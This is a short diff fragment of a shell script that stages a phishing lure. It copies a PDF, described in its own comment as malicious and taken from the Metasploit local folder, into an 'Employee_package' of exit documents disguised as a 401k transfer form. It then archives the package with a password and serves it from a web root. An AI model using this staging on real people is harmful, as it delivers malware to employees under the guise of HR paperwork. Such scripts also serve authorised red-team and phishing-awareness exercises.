@@ -18,7 +18,7 @@ exit;"
 
 # Generate the encrypted archive file with the malicious PDF and benign files
 cp -r exit_documents Employee_package
-cp Company_401k_transfer.pdf Employee_package/
+cp ~/.msf4/local/Company_401k_transfer.pdf Employee_package/
 7z a -p"password" Employee_package.7z Employee_package/
 echo "$SUDO_PASS" | sudo -S cp Employee_package.7z /var/www/html
 rm Employee_package.7z
